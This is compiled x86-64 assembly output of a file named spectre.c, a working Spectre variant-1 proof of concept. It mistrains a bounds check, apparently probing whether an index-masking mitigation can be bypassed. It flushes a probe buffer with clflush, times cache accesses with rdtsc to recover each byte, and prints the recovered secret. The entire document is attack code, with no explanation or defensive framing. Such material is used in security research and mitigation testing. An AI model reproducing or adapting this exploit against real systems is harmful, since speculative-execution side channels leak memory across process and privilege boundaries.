	.file	"spectre.c"
	.text
.Ltext0:
	.type	array_index_mask_nospec, @function
array_index_mask_nospec:
.LFB6:
	.file 1 "./lib/nospec.h"
	.loc 1 3 1
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	.loc 1 11 37
	movq	-16(%rbp), %rax
	subq	-8(%rbp), %rax
	subq	$1, %rax
	.loc 1 11 23
	orq	-8(%rbp), %rax
	.loc 1 11 9
	notq	%rax
	.loc 1 11 47
	sarq	$63, %rax
	.loc 1 12 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	array_index_mask_nospec, .-array_index_mask_nospec
	.globl	array_size
	.data
	.align 4
	.type	array_size, @object
	.size	array_size, 4
array_size:
	.long	8
	.section	.rodata
.LC0:
	.string	"setrlimit failed"
	.text
	.globl	set_heap_limit
	.type	set_heap_limit, @function
set_heap_limit:
.LFB4212:
	.file 2 "spectre.c"
	.loc 2 25 41
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%rdi, -24(%rbp)
	.loc 2 27 17
	movq	-24(%rbp), %rax
	movq	%rax, -16(%rbp)
	.loc 2 28 17
	movq	-24(%rbp), %rax
	movq	%rax, -8(%rbp)
	.loc 2 30 9
	leaq	-16(%rbp), %rax
	movq	%rax, %rsi
	movl	$9, %edi
	call	setrlimit
	.loc 2 30 8
	testl	%eax, %eax
	je	.L5
	.loc 2 31 9
	movl	$.LC0, %edi
	call	perror
	.loc 2 32 9
	movl	$1, %edi
	call	exit
.L5:
	.loc 2 34 1
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4212:
	.size	set_heap_limit, .-set_heap_limit
	.section	.rodata
.LC1:
	.string	"Initial malloc failed"
	.text
	.globl	secret_init
	.type	secret_init, @function
secret_init:
.LFB4213:
	.loc 2 36 23
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	.loc 2 37 22
	movl	$1, %edi
	call	malloc
	movq	%rax, -8(%rbp)
	.loc 2 38 8
	cmpq	$0, -8(%rbp)
	jne	.L7
	.loc 2 39 9
	movl	$.LC1, %edi
	call	perror
	.loc 2 40 16
	movl	$0, %eax
	jmp	.L8
.L7:
	.loc 2 42 14
	movq	-8(%rbp), %rax
	movb	$33, (%rax)
	.loc 2 43 12
	movq	-8(%rbp), %rax
.L8:
	.loc 2 44 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4213:
	.size	secret_init, .-secret_init
	.globl	array_init
	.type	array_init, @function
array_init:
.LFB4214:
	.loc 2 46 22
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	.loc 2 47 22
	movl	array_size(%rip), %eax
	movl	%eax, %eax
	movq	%rax, %rdi
	call	malloc
	movq	%rax, -8(%rbp)
	.loc 2 48 8
	cmpq	$0, -8(%rbp)
	jne	.L10
	.loc 2 49 9
	movl	$.LC1, %edi
	call	perror
	.loc 2 50 16
	movl	$0, %eax
	jmp	.L11
.L10:
	.loc 2 52 12
	movq	-8(%rbp), %rax
.L11:
	.loc 2 53 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4214:
	.size	array_init, .-array_init
	.type	realloc_wrapper, @function
realloc_wrapper:
.LFB4215:
	.loc 2 55 74
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	leaq	-32(%rbp), %rax
	movq	%rax, -16(%rbp)
.LBB38:
.LBB39:
	.file 3 "/usr/lib/gcc/x86_64-redhat-linux/8/include/emmintrin.h"
	.loc 3 1486 3
	movq	-16(%rbp), %rax
	clflush	(%rax)
	leaq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
.LBE39:
.LBE38:
.LBB40:
.LBB41:
	movq	-8(%rbp), %rax
	clflush	(%rax)
.LBE41:
.LBE40:
	.loc 2 58 18
	movq	-40(%rbp), %rdx
	movq	-32(%rbp), %rax
	.loc 2 58 8
	cmpq	%rax, %rdx
	ja	.L13
	.loc 2 58 54 discriminator 1
	movq	-32(%rbp), %rax
	shrq	%rax
	movq	%rax, %rdx
	.loc 2 58 42 discriminator 1
	movq	-40(%rbp), %rax
	.loc 2 58 30 discriminator 1
	cmpq	%rax, %rdx
	ja	.L13
	.loc 2 59 16
	movq	-24(%rbp), %rax
	jmp	.L14
.L13:
	.loc 2 61 16
	movq	-40(%rbp), %rdx
	movq	-24(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	realloc
.L14:
	.loc 2 63 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4215:
	.size	realloc_wrapper, .-realloc_wrapper
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4216:
	.loc 2 65 107
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movq	%rdi, -40(%rbp)
	movq	%rsi, -48(%rbp)
	movl	%edx, -52(%rbp)
	movl	%ecx, -56(%rbp)
	movl	%r8d, -60(%rbp)
	.loc 2 66 14
	movl	-60(%rbp), %eax
	movl	%eax, -4(%rbp)
	.loc 2 67 14
	movl	-60(%rbp), %edx
	movl	array_size(%rip), %eax
	movl	%eax, %ecx
	movq	-40(%rbp), %rax
	movq	(%rax), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	realloc_wrapper
	movq	%rax, %rdx
	.loc 2 67 12
	movq	-40(%rbp), %rax
	movq	%rdx, (%rax)
.LBB42:
	.loc 2 69 23
	movl	-52(%rbp), %eax
	movl	%eax, -8(%rbp)
	movl	-4(%rbp), %eax
	movl	%eax, -12(%rbp)
	movl	-12(%rbp), %edx
	movl	-8(%rbp), %eax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	array_index_mask_nospec
	movq	%rax, -24(%rbp)
	movq	-24(%rbp), %rax
	andl	%eax, -8(%rbp)
	movl	-8(%rbp), %eax
.LBE42:
	.loc 2 69 13
	movb	%al, -25(%rbp)
	.loc 2 70 23
	movq	-40(%rbp), %rax
	movq	(%rax), %rdx
	.loc 2 70 30
	movzbl	-25(%rbp), %eax
	addq	%rdx, %rax
	.loc 2 70 13
	movzbl	(%rax), %eax
	movb	%al, -26(%rbp)
	.loc 2 71 40
	movzbl	-26(%rbp), %eax
	imull	-56(%rbp), %eax
	movl	%eax, %edx
	.loc 2 71 32
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 71 13
	movzbl	(%rax), %eax
	movb	%al, -27(%rbp)
	.loc 2 73 12
	movl	$0, %eax
	.loc 2 74 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4216:
	.size	victim_function, .-victim_function
	.globl	csel
	.type	csel, @function
csel:
.LFB4217:
	.loc 2 86 44
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	%edx, %eax
	movb	%al, -36(%rbp)
	.loc 2 87 20
	movzbl	-36(%rbp), %eax
	movzbl	%al, %eax
	.loc 2 87 12
	negq	%rax
	movq	%rax, -8(%rbp)
	.loc 2 88 15
	movq	-24(%rbp), %rax
	andq	-8(%rbp), %rax
	movq	%rax, %rdx
	.loc 2 88 30
	movq	-8(%rbp), %rax
	notq	%rax
	.loc 2 88 28
	andq	-32(%rbp), %rax
	.loc 2 88 23
	orq	%rdx, %rax
	.loc 2 90 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4217:
	.size	csel, .-csel
	.globl	flush_lines
	.type	flush_lines, @function
flush_lines:
.LFB4218:
	.loc 2 92 56
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
.LBB43:
	.loc 2 93 17
	movq	$0, -8(%rbp)
	.loc 2 93 5
	jmp	.L20
.L21:
	.loc 2 94 36 discriminator 3
	movq	-32(%rbp), %rax
	imulq	-8(%rbp), %rax
	movq	%rax, %rdx
	.loc 2 94 27 discriminator 3
	movq	-24(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -16(%rbp)
.LBB44:
.LBB45:
	.loc 3 1486 3 discriminator 3
	movq	-16(%rbp), %rax
	clflush	(%rax)
.LBE45:
.LBE44:
	.loc 2 93 32 discriminator 3
	addq	$1, -8(%rbp)
.L20:
	.loc 2 93 5 discriminator 1
	movq	-8(%rbp), %rax
	cmpq	-40(%rbp), %rax
	jb	.L21
.LBE43:
	.loc 2 96 1
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4218:
	.size	flush_lines, .-flush_lines
	.section	.rodata
	.align 8
.LC2:
	.string	"Best guess: '%c' (ASCII=%#4x, #hits=%3lu); 2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n"
	.text
	.globl	decode_flush_reload_state
	.type	decode_flush_reload_state, @function
decode_flush_reload_state:
.LFB4219:
	.loc 2 98 69
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	.loc 2 99 14
	movq	$0, -8(%rbp)
	.loc 2 99 29
	movq	$0, -16(%rbp)
	.loc 2 100 19
	movb	$0, -17(%rbp)
	.loc 2 100 33
	movb	$0, -18(%rbp)
.LBB46:
	.loc 2 101 17
	movq	$0, -32(%rbp)
	.loc 2 101 5
	jmp	.L23
.L26:
	.loc 2 102 29
	movq	-32(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-64(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rax
	.loc 2 102 12
	cmpq	%rax, -8(%rbp)
	jnb	.L24
	.loc 2 103 27
	movq	-8(%rbp), %rax
	movq	%rax, -16(%rbp)
	.loc 2 104 23
	movzbl	-17(%rbp), %eax
	movb	%al, -18(%rbp)
	.loc 2 106 29
	movq	-32(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-64(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 106 23
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	.loc 2 107 19
	movq	-32(%rbp), %rax
	movb	%al, -17(%rbp)
.L24:
	.loc 2 101 52 discriminator 2
	addq	$1, -32(%rbp)
.L23:
	.loc 2 101 5 discriminator 1
	movq	-32(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jnb	.L25
	.loc 2 101 32 discriminator 3
	cmpq	$255, -32(%rbp)
	jbe	.L26
.L25:
.LBE46:
	.loc 2 111 10
	call	__ctype_b_loc
	movq	(%rax), %rax
	movzbl	-17(%rbp), %edx
	addq	%rdx, %rdx
	addq	%rdx, %rax
	movzwl	(%rax), %eax
	movzwl	%ax, %eax
	andl	$16384, %eax
	.loc 2 111 8
	testl	%eax, %eax
	je	.L27
	.loc 2 111 8 is_stmt 0 discriminator 1
	movzbl	-17(%rbp), %eax
	jmp	.L28
.L27:
	.loc 2 111 8 discriminator 2
	movl	$63, %eax
.L28:
	.loc 2 111 8 discriminator 4
	movq	-56(%rbp), %rdx
	movb	%al, (%rdx)
	.loc 2 112 18 is_stmt 1 discriminator 4
	call	__ctype_b_loc
	movq	(%rax), %rax
	movzbl	-18(%rbp), %edx
	addq	%rdx, %rdx
	addq	%rdx, %rax
	movzwl	(%rax), %eax
	movzwl	%ax, %eax
	andl	$16384, %eax
	.loc 2 112 10 discriminator 4
	testl	%eax, %eax
	je	.L29
	.loc 2 112 10 is_stmt 0 discriminator 1
	movzbl	-18(%rbp), %eax
	jmp	.L30
.L29:
	.loc 2 112 10 discriminator 2
	movl	$63, %eax
.L30:
	.loc 2 112 10 discriminator 4
	movb	%al, -33(%rbp)
	.loc 2 113 5 is_stmt 1 discriminator 4
	movzbl	-18(%rbp), %edi
	movsbl	-33(%rbp), %esi
	.loc 2 115 16 discriminator 4
	movq	-56(%rbp), %rax
	movzbl	(%rax), %eax
	.loc 2 113 5 discriminator 4
	movsbl	%al, %edx
	.loc 2 115 12 discriminator 4
	movq	-56(%rbp), %rax
	movzbl	(%rax), %eax
	.loc 2 113 5 discriminator 4
	movsbl	%al, %eax
	movq	-8(%rbp), %rcx
	subq	$8, %rsp
	pushq	-16(%rbp)
	movl	%edi, %r9d
	movl	%esi, %r8d
	movl	%eax, %esi
	movl	$.LC2, %edi
	movl	$0, %eax
	call	printf
	addq	$16, %rsp
	.loc 2 116 1 discriminator 4
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4219:
	.size	decode_flush_reload_state, .-decode_flush_reload_state
	.section	.rodata
.LC3:
	.string	"spectre.c"
.LC4:
	.string	"data"
	.align 8
.LC5:
	.string	"Avg. hit latency: %lu, Avg. miss latency: %lu, Threshold: %lu\n"
	.text
	.globl	calibrate_latency
	.type	calibrate_latency, @function
calibrate_latency:
.LFB4220:
	.loc 2 121 30
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	addq	$-128, %rsp
	.loc 2 122 14
	movq	$0, -8(%rbp)
	.loc 2 122 23
	movq	$0, -16(%rbp)
	.loc 2 122 44
	movq	$1000, -32(%rbp)
	.loc 2 123 21
	movl	$8, %edi
	call	malloc
	movq	%rax, -40(%rbp)
	.loc 2 124 5
	cmpq	$0, -40(%rbp)
	jne	.L32
	.loc 2 124 5 is_stmt 0 discriminator 1
	movl	$__PRETTY_FUNCTION__.25760, %ecx
	movl	$124, %edx
	movl	$.LC3, %esi
	movl	$.LC4, %edi
	call	__assert_fail
.L32:
.LBB47:
	.loc 2 127 5 is_stmt 1
	movq	-40(%rbp), %rax
#APP
# 127 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -41(%rbp)
.LBE47:
.LBB48:
	.loc 2 128 19
	movl	$0, -20(%rbp)
	.loc 2 128 5
	jmp	.L33
.L34:
.LBB49:
.LBB50:
	.loc 2 129 26 discriminator 3
#APP
# 129 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
.LBE50:
	.loc 2 129 18 discriminator 3
	movq	%rax, -64(%rbp)
.LBB51:
	.loc 2 130 9 discriminator 3
	movq	-40(%rbp), %rax
#APP
# 130 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -65(%rbp)
.LBE51:
.LBB52:
	.loc 2 131 16 discriminator 3
#APP
# 131 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -80(%rbp)
	movq	-80(%rbp), %rax
.LBE52:
	.loc 2 131 29 discriminator 3
	subq	-64(%rbp), %rax
	.loc 2 131 13 discriminator 3
	addq	%rax, -8(%rbp)
.LBE49:
	.loc 2 128 36 discriminator 3
	addl	$1, -20(%rbp)
.L33:
	.loc 2 128 28 discriminator 1
	movl	-20(%rbp), %eax
	.loc 2 128 5 discriminator 1
	cmpq	%rax, -32(%rbp)
	ja	.L34
.LBE48:
	.loc 2 133 9
	movq	-8(%rbp), %rax
	movl	$0, %edx
	divq	-32(%rbp)
	movq	%rax, -8(%rbp)
.LBB53:
	.loc 2 136 19
	movl	$0, -24(%rbp)
	.loc 2 136 5
	jmp	.L35
.L36:
	movq	-40(%rbp), %rax
	movq	%rax, -128(%rbp)
.LBB54:
.LBB55:
.LBB56:
	.loc 3 1486 3 discriminator 3
	movq	-128(%rbp), %rax
	clflush	(%rax)
.LBE56:
.LBE55:
.LBB57:
	.loc 2 138 26 discriminator 3
#APP
# 138 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rax
.LBE57:
	.loc 2 138 18 discriminator 3
	movq	%rax, -96(%rbp)
.LBB58:
	.loc 2 139 9 discriminator 3
	movq	-40(%rbp), %rax
#APP
# 139 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -97(%rbp)
.LBE58:
.LBB59:
	.loc 2 140 17 discriminator 3
#APP
# 140 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -112(%rbp)
	movq	-112(%rbp), %rax
.LBE59:
	.loc 2 140 30 discriminator 3
	subq	-96(%rbp), %rax
	.loc 2 140 14 discriminator 3
	addq	%rax, -16(%rbp)
.LBE54:
	.loc 2 136 36 discriminator 3
	addl	$1, -24(%rbp)
.L35:
	.loc 2 136 28 discriminator 1
	movl	-24(%rbp), %eax
	.loc 2 136 5 discriminator 1
	cmpq	%rax, -32(%rbp)
	ja	.L36
.LBE53:
	.loc 2 142 10
	movq	-16(%rbp), %rax
	movl	$0, %edx
	divq	-32(%rbp)
	movq	%rax, -16(%rbp)
	.loc 2 144 21
	movq	-16(%rbp), %rax
	leaq	(%rax,%rax), %rdx
	.loc 2 144 29
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	.loc 2 144 15
	movabsq	$-6148914691236517205, %rdx
	mulq	%rdx
	movq	%rdx, %rax
	shrq	%rax
	movq	%rax, -120(%rbp)
	.loc 2 145 5
	movq	-120(%rbp), %rcx
	movq	-16(%rbp), %rdx
	movq	-8(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC5, %edi
	movl	$0, %eax
	call	printf
	.loc 2 148 5
	movq	-40(%rbp), %rax
	movq	%rax, %rdi
	call	free
	.loc 2 149 12
	movq	-120(%rbp), %rax
	.loc 2 150 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4220:
	.size	calibrate_latency, .-calibrate_latency
	.section	.rodata
.LC6:
	.string	"mmap"
	.align 8
.LC7:
	.string	"-----------------------------------------"
	.align 8
.LC8:
	.string	"Secret address: %p, Array address: %p\n"
	.align 8
.LC9:
	.string	"The malicious index is %p-%p=%#lx\n"
.LC10:
	.string	"Recovered secret: \"%s\"\n"
	.text
	.globl	attacker_function
	.type	attacker_function, @function
attacker_function:
.LFB4221:
	.loc 2 153 26
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$2256, %rsp
	.loc 2 156 22
	movl	$0, %eax
	call	array_init
	.loc 2 156 14
	movq	%rax, -184(%rbp)
	.loc 2 157 20
	movl	$0, %eax
	call	secret_init
	movq	%rax, -40(%rbp)
	.loc 2 158 22
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$34, %ecx
	movl	$3, %edx
	movl	$1048576, %esi
	movl	$0, %edi
	call	mmap
	movq	%rax, -48(%rbp)
	.loc 2 160 8
	cmpq	$-1, -48(%rbp)
	jne	.L39
	.loc 2 161 9
	movl	$.LC6, %edi
	call	perror
	.loc 2 162 16
	call	__errno_location
	jmp	.L38
.L39:
	.loc 2 164 5
	movq	-48(%rbp), %rax
	movl	$1048576, %edx
	movl	$1, %esi
	movq	%rax, %rdi
	call	memset
	.loc 2 167 26
	movl	$0, %eax
	call	calibrate_latency
	movq	%rax, -56(%rbp)
	.loc 2 168 5
	movl	$.LC7, %edi
	call	puts
	.loc 2 169 14
	leaq	-2240(%rbp), %rdx
	movl	$0, %eax
	movl	$256, %ecx
	movq	%rdx, %rdi
	rep stosq
	.loc 2 170 10
	movb	$0, -2241(%rbp)
	.loc 2 173 14
	movq	-184(%rbp), %rax
	movq	%rax, -64(%rbp)
	.loc 2 174 30
	movq	-40(%rbp), %rdx
	.loc 2 174 50
	movq	-64(%rbp), %rax
	.loc 2 174 12
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -72(%rbp)
	.loc 2 175 5
	movq	-64(%rbp), %rdx
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC8, %edi
	movl	$0, %eax
	call	printf
	.loc 2 176 5
	movq	-72(%rbp), %rcx
	movq	-64(%rbp), %rdx
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC9, %edi
	movl	$0, %eax
	call	printf
	.loc 2 178 5
	movl	$.LC7, %edi
	call	puts
.LBB60:
	.loc 2 180 17
	movq	$0, -8(%rbp)
	.loc 2 180 5
	jmp	.L41
.L49:
.LBB61:
	.loc 2 182 21
	movq	$0, -16(%rbp)
	.loc 2 182 9
	jmp	.L42
.L47:
.LBB62:
	.loc 2 183 42
	movl	array_size(%rip), %eax
	subl	$1, %eax
	.loc 2 183 20
	movl	%eax, %eax
	movq	%rax, -80(%rbp)
	.loc 2 184 43
	movl	array_size(%rip), %eax
	shrl	%eax
	.loc 2 184 20
	movl	%eax, %eax
	movq	%rax, -88(%rbp)
	.loc 2 185 20
	movq	-72(%rbp), %rax
	addq	$1, %rax
	movq	%rax, -96(%rbp)
.LBB63:
	.loc 2 186 25
	movq	$0, -24(%rbp)
	.loc 2 186 13
	jmp	.L43
.L44:
.LBB64:
	.loc 2 190 37 discriminator 3
	movq	-24(%rbp), %rax
	andl	$15, %eax
	.loc 2 190 22 discriminator 3
	cmpq	$15, %rax
	sete	%al
	movb	%al, -97(%rbp)
	.loc 2 191 31 discriminator 3
	movzbl	-97(%rbp), %edx
	movq	-80(%rbp), %rcx
	movq	-96(%rbp), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	csel
	movq	%rax, -112(%rbp)
	.loc 2 192 32 discriminator 3
	movzbl	-97(%rbp), %edx
	movq	-88(%rbp), %rcx
	movq	-72(%rbp), %rax
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	csel
	movq	%rax, -120(%rbp)
	.loc 2 197 17 discriminator 3
	movq	-48(%rbp), %rax
	movl	$256, %edx
	movl	$4096, %esi
	movq	%rax, %rdi
	call	flush_lines
.LBB65:
.LBB66:
	.loc 3 1498 3 discriminator 3
	mfence
.LBE66:
.LBE65:
.LBB67:
.LBB68:
	.loc 3 1492 3 discriminator 3
	lfence
.LBE68:
.LBE67:
.LBB69:
	.loc 2 210 17 discriminator 3
	movq	-112(%rbp), %rax
	movl	%eax, %ecx
	movq	-120(%rbp), %rax
	movl	%eax, %edx
	movq	-48(%rbp), %rsi
	leaq	-184(%rbp), %rax
	movl	%ecx, %r8d
	movl	$4096, %ecx
	movq	%rax, %rdi
	call	victim_function
	movq	%rax, -128(%rbp)
	movq	-128(%rbp), %rax
#APP
# 210 "spectre.c" 1
	xor %rax, %rax

# 0 "" 2
#NO_APP
	movq	%rax, -128(%rbp)
.LBE69:
.LBE64:
	.loc 2 186 53 discriminator 3
	addq	$1, -24(%rbp)
.L43:
	.loc 2 186 13 discriminator 1
	cmpq	$15, -24(%rbp)
	jbe	.L44
.LBE63:
.LBB70:
	.loc 2 213 25
	movq	$0, -32(%rbp)
	.loc 2 213 13
	jmp	.L45
.L46:
.LBB71:
	.loc 2 216 33 discriminator 3
	movq	-32(%rbp), %rax
	imulq	$167, %rax, %rax
	.loc 2 216 39 discriminator 3
	addq	$13, %rax
	.loc 2 216 24 discriminator 3
	andl	$255, %eax
	movq	%rax, -136(%rbp)
	.loc 2 220 50 discriminator 3
	movq	-136(%rbp), %rax
	salq	$12, %rax
	movq	%rax, %rdx
	.loc 2 220 26 discriminator 3
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -144(%rbp)
.LBB72:
.LBB73:
	.loc 2 221 31 discriminator 3
#APP
# 221 "spectre.c" 1
	mfence
	lfence
	rdtsc
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -152(%rbp)
	movq	-152(%rbp), %rax
.LBE73:
	movq	%rax, -160(%rbp)
.LBB74:
	movq	-144(%rbp), %rax
#APP
# 221 "spectre.c" 1
	mov (%rax), %al

# 0 "" 2
#NO_APP
	movb	%al, -161(%rbp)
.LBE74:
.LBB75:
#APP
# 221 "spectre.c" 1
	rdtscp
	shl $32, %rdx
	or %rdx, %rax
	lfence
# 0 "" 2
#NO_APP
	movq	%rax, -176(%rbp)
	movq	-176(%rbp), %rax
.LBE75:
	subq	-160(%rbp), %rax
.LBE72:
	.loc 2 221 50 discriminator 3
	cmpq	-56(%rbp), %rax
	setbe	%al
	movzbl	%al, %ecx
	.loc 2 221 27 discriminator 3
	movq	-136(%rbp), %rax
	movq	-2240(%rbp,%rax,8), %rdx
	.loc 2 221 50 discriminator 3
	movslq	%ecx, %rax
	.loc 2 221 27 discriminator 3
	addq	%rax, %rdx
	movq	-136(%rbp), %rax
	movq	%rdx, -2240(%rbp,%rax,8)
.LBE71:
	.loc 2 213 49 discriminator 3
	addq	$1, -32(%rbp)
.L45:
	.loc 2 213 13 discriminator 1
	cmpq	$255, -32(%rbp)
	jbe	.L46
.LBE70:
.LBE62:
	.loc 2 182 38 discriminator 2
	addq	$1, -16(%rbp)
.L42:
	.loc 2 182 9 discriminator 1
	cmpq	$99, -16(%rbp)
	jbe	.L47
.LBE61:
	.loc 2 226 9 discriminator 2
	leaq	-2241(%rbp), %rdx
	movq	-8(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	leaq	-2240(%rbp), %rax
	movl	$256, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	decode_flush_reload_state
	.loc 2 227 9 discriminator 2
	leaq	-2240(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset
	.loc 2 180 61 discriminator 2
	addq	$1, -8(%rbp)
.L41:
	.loc 2 180 28 discriminator 1
	movq	-40(%rbp), %rax
	movq	%rax, %rdi
	call	strlen
	.loc 2 180 5 discriminator 1
	cmpq	%rax, -8(%rbp)
	jnb	.L48
	.loc 2 180 43 discriminator 3
	cmpq	$0, -8(%rbp)
	je	.L49
.L48:
.LBE60:
	.loc 2 229 5
	leaq	-2241(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC10, %edi
	movl	$0, %eax
	call	printf
	.loc 2 230 5
	movq	-48(%rbp), %rax
	movl	$1048576, %esi
	movq	%rax, %rdi
	call	munmap
	.loc 2 231 5
	movq	-184(%rbp), %rax
	movq	%rax, %rdi
	call	free
	.loc 2 232 5
	nop
.L38:
	.loc 2 233 1
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4221:
	.size	attacker_function, .-attacker_function
	.globl	main
	.type	main, @function
main:
.LFB4222:
	.loc 2 236 12
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	.loc 2 237 5
	movl	$10485760, %edi
	call	set_heap_limit
	.loc 2 238 5
	movl	$0, %eax
	call	attacker_function
	.loc 2 239 12
	movl	$0, %eax
	.loc 2 240 1
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4222:
	.size	main, .-main
	.section	.rodata
	.align 16
	.type	__PRETTY_FUNCTION__.25760, @object
	.size	__PRETTY_FUNCTION__.25760, 18
__PRETTY_FUNCTION__.25760:
	.string	"calibrate_latency"
	.text
.Letext0:
	.file 4 "/usr/lib/gcc/x86_64-redhat-linux/8/include/stddef.h"
	.file 5 "/usr/include/bits/types.h"
	.file 6 "/usr/include/bits/types/struct_FILE.h"
	.file 7 "/usr/include/bits/types/FILE.h"
	.file 8 "/usr/include/stdio.h"
	.file 9 "/usr/include/bits/sys_errlist.h"
	.file 10 "/usr/include/bits/stdint-uintn.h"
	.file 11 "/usr/include/stdint.h"
	.file 12 "/usr/include/bits/resource.h"
	.file 13 "/usr/include/ctype.h"
	.section	.note.GNU-stack,"",@progbits
